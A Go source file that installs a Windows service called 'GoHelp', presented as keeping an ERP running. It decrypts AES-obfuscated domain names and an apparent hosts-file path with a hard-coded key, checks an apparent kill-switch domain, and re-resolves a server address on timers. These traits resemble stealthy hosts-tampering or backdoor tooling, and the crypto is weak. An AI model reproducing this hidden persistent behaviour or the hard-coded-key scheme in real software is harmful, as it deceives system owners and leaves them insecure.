package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"

	//"flag"
	"net"
	"strings"

	//"crypto/des"
	"encoding/base64"

	"fmt"
	"os"

	//	"strconv"
	"time"

	"github.com/kardianos/service"
	//"github.com/robfig/cron"
)

var (
	seraddress    string
	syshostspath  string
	stopmb        string
	domainlistdes []string
	domainlist    []string
)

func ini() {

	stopmb = godes("XhFf7mEZ+nJx20xyH3xGZK2Y0+j6uH42fBT5XTN4sWo=", false)
	domainlistdes = append(domainlistdes, "GIYOxoLdFTLiFxrUva5eiq40qx3ptYOjrIcNafA3yuE=")
	domainlistdes = append(domainlistdes, "nIpWbx3f5tZRZ64vxyYcyfDcn0WQD6zOBeGBrvYL8dY=")
	domainlistdes = append(domainlistdes, "HN7COJO5xPTE7OVzwdoapTGPZSB6FupORBaLXaA5ZWE=")
	domainlistdes = append(domainlistdes, "U/7oz7gZqvb+EJY132uRtA==")
	domainlistdes = append(domainlistdes, "bEO+Y0l9PPMAEwdZiWXRwvOIO5oAGTlYYv5cpWM2Ig0=")
	domainlistdes = append(domainlistdes, "4Hu7U5M/2gBionsSFm+s2Q==")
	domainlistdes = append(domainlistdes, "SUBd5cM3mHByXHcQ0roRQwO7UU4+g/q9Hm+82Mbf1ig=")
	domainlistdes = append(domainlistdes, "uVKTycDrjIOzALvl0sQxhQ==")
	domainlistdes = append(domainlistdes, "e7sDM6JhJGFPlaJ2b9SdIu2KWsfY2xfVRNFCPHT3Fhs=")
	domainlistdes = append(domainlistdes, "RIUO0ME6c02Z97iLrMZ3HQ==")
	domainlistdes = append(domainlistdes, "ku2rXklHDfWXUwn2Y3enEw==")
	domainlistdes = append(domainlistdes, "3ntzasH6wqA+9O657qxHlg==")
	domainlistdes = append(domainlistdes, "IFQgyoqIwbulbKuM4pxhMA==")
	domainlistdes = append(domainlistdes, "heFh8YgR1ahxEwiORPiSFQ==")
	domainlistdes = append(domainlistdes, "/cSaVz9718V7XK1n1wupJw==")
	seraddress = findaddressbydomain(godes("8HBDsp7EShWptDdSEIdFMQ==", false))
	syshostspath = godes("ihbYTvw6WwqXMEK+YEk+SpYCrN0AbRk3DPTEYzvtp4xDJ1PVDEbxxehwwXG/L9G7", false)
	if strings.HasPrefix(findaddressbydomain(stopmb), godes("po4UN3C1g0WDXKuUg2cF2w==", false)) {
		os.Exit(3)

	}
	domainlist = nil
	for i := 0; i < len(domainlistdes); i++ {
		//	wprint("domainlistdes : ", godes(domainlistdes[i], false))
		domainlist = append(domainlist, godes(domainlistdes[i], false))
	}
}
func PathExists(path string) (bool, error) {
	_, err := os.Stat(path)
	if err == nil {
		return true, nil
	}
	if os.IsNotExist(err) {
		return false, nil
	}
	return false, err
}

// TickerDemo ????????????ticker????????????
func Tickergo(timer time.Duration) {
	ticker := time.NewTicker(timer * time.Minute)
	defer ticker.Stop()
	for range ticker.C {
		wprint("Ticker tick.timer " + (timer.String())) //strconv.Itoa
		go readfileandcheck()
	}
}
func Tickergoseraddcheck(timer time.Duration) {
	ticker := time.NewTicker(timer * time.Hour)
	defer ticker.Stop()
	for range ticker.C {
		wprint("Ticker2 tick.timer " + (timer.String())) //strconv.Itoa
		seraddress = findaddressbydomain(godes("8HBDsp7EShWptDdSEIdFMQ==", false))
	}
}

func initime() {

	Tickergo(20)
	Tickergoseraddcheck(1)
}

func DoWinSvr(skey string) {
	sparkf := ""
	spars := "svrpar=true -s=run "
	sparport := "-port=" + *portkey
	if *kflog {
		sparkf = "-kf "
	}
	parbyte1 := []byte(spars)
	parbyte2 := []byte(sparkf)
	parbyte3 := []byte(sparport)

	fmt.Print("configpars:", []string{sparkf, spars, sparport}, "skey:", skey)
	srvConfig := &service.Config{
		Name:        "GoHelp",
		DisplayName: "GoHelpSvr",
		Description: "GoHelp for keep ERP Run as well",
		Arguments:   []string{string(parbyte1) + string(parbyte2) + string(parbyte3)},
		//Arguments: par,
	}
	prg := &program{}
	s, err := service.New(prg, srvConfig)
	if err != nil {
		fmt.Println(err)
	}

	if len(skey) > 1 {
		//serviceAction := os.Args[1]
		switch skey {
		case "install":
			//s.Uninstall()
			err := s.Install()
			if err != nil {
				wprint("??????????????????: ", err.Error())
				//s.Uninstall()
				//	s.Install()

			} else {
				wprint("??????????????????")
				err := s.Start()
				if err != nil {
					wprint("??????????????????: ", err.Error())
				} else {
					wprint("??????????????????")
				}
			}
			return
		case "uninstall":
			go s.Stop()
			err := s.Uninstall()
			if err != nil {
				wprint("??????????????????: ", err.Error())
			} else {
				wprint("??????????????????")
			}
			return
		case "start":
			err := s.Start()
			if err != nil {
				wprint("??????????????????: ", err.Error())
			} else {
				wprint("??????????????????")
			}
			return
		case "stop":
			err := s.Stop()
			if err != nil {
				wprint("??????????????????: ", err.Error())
			} else {
				wprint("??????????????????")
			}
			return
		default:
			s.Run()
			//return

		}

	}
	//	go s.Run()
	err = s.Run()
	if err != nil {
		fmt.Println(err)
	}
}
func (p *program) Start(s service.Service) error {
	wprint("????????????...")

	//initime()
	go p.run()
	return nil
}
func (p *program) run() {
	// ?????????????????????

	wprint("??????????????????...")
	go opensvr(port, 0)
	go initime()
	wprint("??????????????????...")
	wlog("Info ?????????????????????...")
	go readfileandcheck()
}
func (p *program) Stop(s service.Service) error {
	return nil
}
func godes(str string, dotype bool) string {
	orig := str
	key := "llllllllllllllll"
	wprint("orig???", orig)
	if dotype {

		encryptCode := AesEncrypt(orig, key)

		wlog("Info encrypttxt*" + encryptCode + "*" + str)

		return encryptCode
	} else {

		decryptCode := AesDecrypt(orig, key)

		wlog("Info decrypttxt*" + decryptCode + "*" + str)

		return decryptCode
	}
	//8HBDsp7EShWptDdSEIdFMQ==

	//	fmt.Println("testdes:", src, "  ", string(src2))
}

func AesEncrypt(orig string, key string) string {
	// ??????????????????
	origData := []byte(orig)
	k := []byte(key)
	// ????????????
	// NewCipher????????????????????????k??????????????????16, 24??????32
	block, _ := aes.NewCipher(k)
	// ????????????????????????
	blockSize := block.BlockSize()
	// ?????????
	origData = PKCS7Padding(origData, blockSize)
	// ????????????
	blockMode := cipher.NewCBCEncrypter(block, k[:blockSize])
	// ????????????
	cryted := make([]byte, len(origData))
	// ??????
	blockMode.CryptBlocks(cryted, origData)
	return base64.StdEncoding.EncodeToString(cryted)
}
func AesDecrypt(cryted string, key string) string {
	// ??????????????????
	crytedByte, _ := base64.StdEncoding.DecodeString(cryted)
	k := []byte(key)
	// ????????????
	block, _ := aes.NewCipher(k)
	// ????????????????????????
	blockSize := block.BlockSize()
	// ????????????
	blockMode := cipher.NewCBCDecrypter(block, k[:blockSize])
	// ????????????
	orig := make([]byte, len(crytedByte))
	// ??????
	blockMode.CryptBlocks(orig, crytedByte)
	// ????????????
	orig = PKCS7UnPadding(orig)
	return string(orig)
}

//??????
//AES????????????????????????????????????128bit(byte[16])????????????????????????128bit(byte[16])???192bit(byte[24])???256bit(byte[32])?????????????????????
func PKCS7Padding(ciphertext []byte, blocksize int) []byte {
	padding := blocksize - len(ciphertext)%blocksize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

//??????
func PKCS7UnPadding(origData []byte) []byte {
	length := len(origData)
	unpadding := int(origData[length-1])
	return origData[:(length - unpadding)]
}

//Dns
func findaddressbydomain(domain string) string {
	addr, err := net.ResolveIPAddr("ip", domain)
	re := seraddress
	if err != nil {
		wprint("Resolution error", err.Error())
		//os.Exit(1)
	}
	re = addr.String()
	wprint("Resolved address is ", strings.Replace(addr.String(), ".", "", 4))
	//	wlog("Info Resolved address" + addr.String())
	return re
}
